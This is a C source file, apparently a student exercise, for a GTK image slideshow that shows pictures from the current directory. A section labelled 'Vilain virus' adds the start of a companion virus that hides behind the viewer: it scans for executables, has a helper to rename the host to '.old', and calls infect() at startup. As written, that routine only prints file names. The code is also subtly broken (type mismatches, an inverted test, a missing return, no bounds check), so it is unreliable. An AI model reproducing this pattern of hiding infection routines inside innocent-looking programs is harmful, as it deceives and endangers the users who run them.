#include <gtk/gtk.h>
// Pour resize 
#include <gdk-pixbuf/gdk-pixbuf.h>

// Partie de MediaPlayer
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>


#define MAX 20

// Permet de voir si le fichier est compté dans l'une des extensions.
int image(const char *fichier){
	const char *extension[] = {".jpg" , ".png", ".jpeg", ".bmp",NULL};
	for (int i = 0; extension[i] != NULL; i++){
        if(strstr(fichier, extension[i])){
        	return 1;	
        }
} 	return 0;
}

// Remplie la liste prise en paramètre avec les images du répertoires courants. 
void *fct_tmp(char **liste)
{
	int cpt = 0;    
	DIR *rep = opendir(".");
	if(rep != NULL){
        struct dirent * ent;
        while((ent = readdir(rep)) != NULL){
        	if(image(ent->d_name)){
                liste[cpt] = strdup(ent->d_name);
                cpt++;
            }
        }
    	closedir(rep);
    	}
    	liste[cpt]=NULL;
}

// Fin de la partie MediaPlayer.

// Ma structure avec toutes mes variables essentielles.
typedef struct {
	char **images;
	int nb_images;
	int actuelle_image;
	GtkWidget *image_widget;
} Images;

// Pour resize les images
gboolean resize(GtkWidget *widget){
	GdkPixbuf *pixbuf = gtk_image_get_pixbuf(GTK_IMAGE(widget));
    	pixbuf = gdk_pixbuf_scale_simple(pixbuf, 800,  600, GDK_INTERP_BILINEAR);
    	gtk_image_set_from_pixbuf(GTK_IMAGE(widget), pixbuf);
    
    	// Pour vider l'emplacement du pixbuf plus utilisé
    	g_object_unref(pixbuf);
    
    	return FALSE;
}

// Charge les images
void chargerImages(Images *diapo) {
    	if (diapo->nb_images > 0) {
    		gtk_image_set_from_file(GTK_IMAGE(diapo->image_widget),diapo->images[diapo->actuelle_image]);
        	resize(diapo->image_widget);
	}
}

// Image précédente
void precedente(GtkWidget *widget, Images *diapo) {
    	if (diapo->actuelle_image > 0){
    		diapo->actuelle_image--;
    		chargerImages(diapo);
    	}
}

// Image suivante
void suivante(GtkWidget *widget, Images *diapo) {
    	if(diapo->actuelle_image < diapo->nb_images-1){
    		diapo->actuelle_image++;
    		chargerImages(diapo);
    	}
}

// Vilain virus 
// Je verifie si c'est un exécutable
int est_exe(const char *fichier){
	struct stat sb;
	if (lstat(fichier, &sb) == -1) {
               perror("lstat");
               exit(EXIT_FAILURE);
           }
	if ((strstr(fichier, ".old")) || (strcmp(fichier, "MediaPlayer"))){
		if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {
			return 1;  
			}
	}
		return 0;  
}

void duplication(char *source, const char ouvreur){
	// je rename mon programme "pg" en "pg.old"
	char dest[100];
	snprintf(dest, sizeof(dest), "%s.old", source);
	rename(source, dest);


} 

void infect(const char lanceur){
	DIR *rep = opendir(".");
	if(rep != NULL){
        struct dirent * ent;
        while((ent = readdir(rep)) != NULL){
        	if(est_exe(ent->d_name)){
				printf("%s", ent->d_name);
			}
		}
	}
}

int main(int argc, char *argv[]) {
    	gtk_init(&argc, &argv);
    
    	char *fichiers[MAX+1];
    	fct_tmp(fichiers);
    
    	infect(argv[0]);
    	// Je compte le nombre de fichier dans 
    	int count = 0;
    	for(int i = 0; fichiers[i] != NULL; i++){
    		count++;
    	}

    	Images diapo = {fichiers, count, 0, gtk_image_new()};

	// La partie affichage
    	GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    	gtk_window_set_title(GTK_WINDOW(window), "Images");
    	gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);
    	g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

    	GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    	gtk_container_add(GTK_CONTAINER(window), vbox);
    	gtk_box_pack_start(GTK_BOX(vbox), diapo.image_widget, TRUE, TRUE, 0);

    	GtkWidget *button_box = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 5);
    	gtk_box_pack_start(GTK_BOX(vbox), button_box, FALSE, FALSE, 0);

    	GtkWidget *prev = gtk_button_new_with_label("Précédent");
    	g_signal_connect(prev, "clicked", G_CALLBACK(precedente), &diapo);
    	gtk_box_pack_start(GTK_BOX(button_box), prev, TRUE, TRUE, 0);

    	GtkWidget *next = gtk_button_new_with_label("Suivant");
    	g_signal_connect(next, "clicked", G_CALLBACK(suivante), &diapo);
    	gtk_box_pack_start(GTK_BOX(button_box), next, TRUE, TRUE, 0);

    	chargerImages(&diapo);
    	gtk_widget_show_all(window);
    	gtk_main();

    	return 0;
}
